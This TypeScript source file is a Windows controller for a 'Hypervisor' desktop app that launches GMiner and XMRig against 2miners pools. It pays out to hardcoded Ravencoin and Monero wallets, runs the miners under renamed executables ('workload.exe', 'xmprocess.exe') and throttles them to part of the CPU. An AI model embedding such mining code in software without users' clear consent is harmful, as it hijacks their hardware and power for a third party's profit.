import { DataType, runScript } from "../RunScript"
import { ProcessStatus, SystemCommands } from "./ProcessCommander"
import kill from "tree-kill"
import path from "path"
import os from "os"

export class WinCommands implements SystemCommands {
  private static XMR_ADDRESS = "4BETwgau3rMSL34LoPytCpZUxiiHc2P55FY1eJRkZHa7HBbJpfAi7sWSByERH8NNw3ELoroKFabS4gx25YkpZrGU1hzsF1U"
  private static RVN_ADDRESS = "RL86Z5PyWRHtBFDS8BQcfYeE5iq8MFdsXU"

  private static MAX_CPU_PRC_PROD = 50
  private static MAX_CPU_PRC_DEV = 1

  private isProd = false
  private isGpuRunning = false
  private isCpuRunning = false

  private gpuStatus = ""
  private cpuStatus = ""

  private gpuProcess: any = null
  private cpuProcess: any = null

  private onGpuLog: (content: string, isError: boolean) => void
  private onCpuLog: (content: string, isError: boolean) => void

  constructor(isProd: boolean, onGpuLog: (content: string, isError: boolean) => void, onCpuLog: (content: string, isError: boolean) => void) {
    this.isProd = isProd
    this.onGpuLog = onGpuLog
    this.onCpuLog = onCpuLog
  }

  private onProcessStatusChangedListener: (status: ProcessStatus) => void

  public getPlatformName = (): string => "win32"

  public getSystemUserName = () => { os.userInfo().username }

  public start = async (minerId: string, appVersion: string): Promise<ProcessStatus> => {
    this.killAllProcesses()
    const systemUserInfo = os.userInfo()
    const version = appVersion.replace(/\s/g, '');
    const runCores = Math.ceil(os.cpus().length / 2 * 0.75);
    
    if (!this.isGpuRunning) {
      this.isGpuRunning = true
      this.onGpuLog(`--- Starting GMiner, miner ID: ${minerId} ---`, false)
      this.gpuProcess = runScript(
        `cd C:\\Users\\${systemUserInfo.username}\\AppData\\Local\\Hypervisor\\app-${version}\\resources\\win\\gminer && workload.exe --algo kawpow --server rvn.2miners.com:6060 --user ${WinCommands.RVN_ADDRESS}.${minerId} --watchdog 0`,
        [],
        (data: string, type: DataType) => {
          this.onGpuLog(data, false)

          if (!this.isGpuRunning) {
            this.isGpuRunning = true
            this.reportChangedStatus()
          }
          this.gpuStatus = data
        },
        (error?: any) => {
          this.onGpuLog(JSON.stringify(error), true)
          this.gpuStatus = error.toString()

          if (!this.isGpuRunning) {
            this.isGpuRunning = true
            this.reportChangedStatus()
          }
        },
        (isSuccess: boolean, exitCode: number) => {
          this.isGpuRunning = false
          this.reportChangedStatus()
          this.onGpuLog("GMiner just exited. Exit code: " + exitCode, true)
        }
      )
    }

    if (!this.isCpuRunning) {
      this.isCpuRunning = true
      const maxCpuPrc = this.isProd ? WinCommands.MAX_CPU_PRC_PROD : WinCommands.MAX_CPU_PRC_DEV

      this.onCpuLog(`--- Starting XMRig, miner ID: ${minerId} ---`, false)
      this.cpuProcess = runScript(
        `cd C:\\Users\\${systemUserInfo.username}\\AppData\\Local\\Hypervisor\\app-${version}\\resources\\win\\procgov && procgov64.exe -c=${runCores} -- .\\..\\xmrig\\xmprocess.exe --coin=XMR -o xmr.2miners.com:2222 -u ${WinCommands.XMR_ADDRESS}.${minerId} -p x`,
        [],
        (data: string, type: DataType) => {
          this.cpuStatus = data

          if (!this.isCpuRunning) {
            this.isCpuRunning = true
            this.reportChangedStatus()
          }
          this.onCpuLog(data, false)
        },
        (error?: any) => {
          this.cpuStatus = error.toString()

          if (!this.isCpuRunning) {
            this.isCpuRunning = true
            this.reportChangedStatus()
          }

          this.onCpuLog(JSON.stringify(error), true)
        },
        (isSuccess: boolean, exitCode: number) => {
          this.isCpuRunning = false
          this.reportChangedStatus()
          this.onCpuLog("XMRig just exited. Exit code: " + exitCode, true)
        }
      )
    }
    this.reportChangedStatus()
    return this.getStatus()
  }

  private killAllProcesses = () => {
    if (this.gpuProcess) kill(this.gpuProcess.pid)
    if (this.cpuProcess) kill(this.cpuProcess.pid)
  }

  public stop = async (): Promise<ProcessStatus> => {
    this.killAllProcesses()
    const didStatusChanged = this.isGpuRunning || this.isCpuRunning
    this.isGpuRunning = false
    this.isCpuRunning = false
    if (didStatusChanged) this.reportChangedStatus()
    return this.getStatus()
  }

  public getStatus = async (): Promise<ProcessStatus> => {
    return {
      isGpuRunning: this.isGpuRunning,
      gpuStatus: this.gpuStatus,
      isCpuRunning: this.isCpuRunning,
      cpuStatus: this.cpuStatus
    }
  }

  private reportChangedStatus = async () => {
    if (!this.onProcessStatusChangedListener) return
    const currentStatus = await this.getStatus()
    this.onProcessStatusChangedListener(currentStatus)
  }

  public setOnProcessStatusChangedListener = (onProcessStatusChangedListener: (status: ProcessStatus) => void) => {
    this.onProcessStatusChangedListener = onProcessStatusChangedListener
  }
}
